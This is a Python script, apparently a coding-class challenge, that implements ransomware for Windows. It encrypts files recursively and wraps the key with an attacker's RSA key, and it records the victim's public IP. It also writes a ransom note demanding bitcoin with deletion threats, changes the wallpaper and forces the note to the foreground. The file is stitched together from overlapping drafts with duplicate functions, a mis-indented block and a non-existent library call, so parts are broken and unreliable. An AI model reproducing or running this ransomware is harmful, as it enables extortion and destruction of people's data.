#! /usr/bin/python 3



# Script:   code challenge 5             
# Author: Raheem Sharif Reed                     
# Date of latest revision: July 19,2023     
# Purpose:In Python, create a script that utilizes the cryptography library to:
#Prompt the user to select a mode:
#Encrypt a file (mode 1)
#Decrypt a file (mode 2)
#Encrypt a message (mode 3)
#Decrypt a message (mode 4)
#If mode 1 or 2 are selected, prompt the user to provide a filepath to a target file.
#If mode 3 or 4 are selected, prompt the user to provide a cleartext string.
#Depending on the selection, perform one of the below functions. You’ll need to create four functions:
#Encrypt the target file if in mode 1.
#Delete the existing target file and replace it entirely with the encrypted version.
#Decrypt the target file if in mode 2.
#Delete the encrypted target file and replace it entirely with the decrypted version.
#Encrypt the string if in mode 3.
#Print the ciphertext to the screen.
#Decrypt the string if in mode 4.
#Print the cleartext to the screen.
#Recursively encrypt a single folder and all its contents.
#Recursively decrypt a single folder that was encrypted by this tool.
#Alter the desktop wallpaper on a Windows PC with a ransomware message
#Create a popup window on a Windows PC with a ransomware message

# Imports
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os # to get system root
import webbrowser # to load webbrowser to go to specific website eg bitcoin
import ctypes # so we can intereact with windows dlls and change windows background etc
import urllib.request # used for downloading and saving background image
import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to create process for notepad and open ransom  note
import win32gui # used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading # used for ransom note and decryption key on dekstop

class RansomWare:

 # File exstensions to seek out and Encrypt
    file_exts = [
        'txt',
       # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
       # -and leaves other files un-ecnrypted etc.
       # 'png', 

    ]


    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None

        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = os.path.expanduser('~')
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot' # Debugging/Testing

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        self.publicIP = requests.get('https://api.ipify.org').text


    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generationx_key(self):
        # Generates a url safe(base64 encoded) key
        self.key =  Fernet.generationx_key()
        # Creates a Fernet object with encrypt/decrypt methods
        self.crypter = Fernet(self.key)

    
    # Write the fernet(symmetric key) to text file
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)


    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # Public RSA key
            self.public_key = RSA.import_key(open('public.pem').read())
            # Public encrypter object
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # Write encrypted fernet key to file
            f.write(enc_fernent_key)
        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # Remove fernet crypter object
        self.crypter = None


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.crypter.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print('Why is my file encrypted')
                print(_data)
            else:
                # Decrypt data from file
                _data = self.crypter.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print('> the file is decrypted')
                print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


    @staticmethod
    def what_is_youtube():
        url = 'https://www.youtube.com/'
        # Open browser to the https://www.youtube.com/ so they know what youtube is
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://avatarfiles.alphacoders.com/312/thumb-150-312691.jpg'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The harddisks of your computer have been encrypted with an code geass encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to bankai@gamil.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')


    def show_ransom_note(self):
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            # sleep for 10 seconds
            time.sleep(10)
            count +=1 
            if count == 5:
                break

    
    # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
    def put_me_on_desktop(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
        # -the files
        print('started') # Debugging/Testing
        while True:
            try:
                print('trying') # Debugging/Testing
                # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
                # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print('decrypted') # Debugging/Testing
                    break
            except Exception as e:
                print(e) # Debugging/Testing
                pass
            time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
            print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
            # Would use below code in real life etc... above 10secs is just to "show" concept
            # Sleep ~ 3 mins
            # secs = 60
            # mins = 3
            # time.sleep((mins*secs))



def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.generationx_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_youtube()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
    print('> RansomWare: Completed') # Debugging/Testing

    # Function to generate a new RSA key pair
def generate_rsa_key_pair():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    with open("private_key.pem", "wb") as private_key_file:
        private_key_file.write(private_key)
    with open("public_key.pem", "wb") as public_key_file:
        public_key_file.write(public_key)

# Function to load the RSA private key
def load_rsa_private_key():
    with open("private_key.pem", "rb") as private_key_file:
        private_key = RSA.import_key(private_key_file.read())
    return private_key

# Function to load the RSA public key
def load_rsa_public_key():
    with open("public_key.pem", "rb") as public_key_file:
        public_key = RSA.import_key(public_key_file.read())
    return public_key

# Function to encrypt a file using AES
def encrypt_file(file_path, aes_key):
    with open(file_path, "rb") as file:
        data = file.read()

    cipher = AES.new(aes_key, AES.MODE_EAX)
    encrypted_data, tag = cipher.encrypt_and_digest(data)

    with open(file_path + ".enc", "wb") as file:
        [file.write(x) for x in (cipher.nonce, tag, encrypted_data)]

# Function to decrypt a file using AES
def decrypt_file(file_path, aes_key):
    with open(file_path, "rb") as file:
        nonce, tag, encrypted_data = [file.read(x) for x in (16, 16, -1)]

    cipher = AES.new(aes_key, AES.MODE_EAX, nonce)
    decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)

    with open(os.path.splitext(file_path)[0], "wb") as file:
        file.write(decrypted_data)

# Main function
def main():
    if not os.path.exists("private_key.pem") or not os.path.exists("public_key.pem"):
        generate_rsa_key_pair()

    mode = int(input("Select a mode:\n1. Encrypt a file\n2. Decrypt a file\n"))

    if mode == 1:
        file_to_encrypt = input("Enter the file path to encrypt: ")
        public_key = load_rsa_public_key()
        aes_key = get_random_bytes(32)  # 256-bit AES key
        cipher_rsa = PKCS1_OAEP.new(public_key)
        encrypted_aes_key = cipher_rsa.encrypt(aes_key)
        with open(file_to_encrypt + ".enc_key", "wb") as key_file:
            key_file.write(encrypted_aes_key)
        encrypt_file(file_to_encrypt, aes_key)
        print("File encrypted successfully.")
    elif mode == 2:
        file_to_decrypt = input("Enter the file path to decrypt: ")
        private_key = load_rsa_private_key()
        with open(file_to_decrypt + ".enc_key", "rb") as key_file:
            encrypted_aes_key = key_file.read()
        cipher_rsa = PKCS1_OAEP.new(private_key)
        aes_key = cipher_rsa.decrypt(encrypted_aes_key)
        decrypt_file(file_to_decrypt, aes_key)
        print("File decrypted successfully.")
    else:
        print("Invalid mode selected.")

    


# Function to generate a new encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

# Function to load the encryption key
def load_key():
    with open("key.key", "rb") as key_file:
        key = key_file.read()
    return key

# Function to encrypt a file
def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        data = file.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Function to decrypt a file
def decrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

# Function to encrypt all files in a folder and its subfolders
def encrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

# Function to decrypt all files in a folder and its subfolders
def decrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

  
  def run_ransomeware():
    subprocess.run(['python', 'ransomeware.py'])
  #ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt']) 
  
          

# Main function
def main():
    if not os.path.exists("key.key"):
        generate_key()

    mode = int(input("Select a mode:\n1. Encrypt a folder\n2. Decrypt a folder\n"))

    folder_to_encrypt = input("Enter the folder path: ")

    key = load_key()

    if mode == 1:
        encrypt_folder(folder_to_encrypt, key)
        print("Folder encrypted successfully.")
    elif mode == 2:
        decrypt_folder(folder_to_encrypt, key)
        print("Folder decrypted successfully.")
    else:
        print("Invalid mode selected.")

if __name__ == "__main__":
    main()

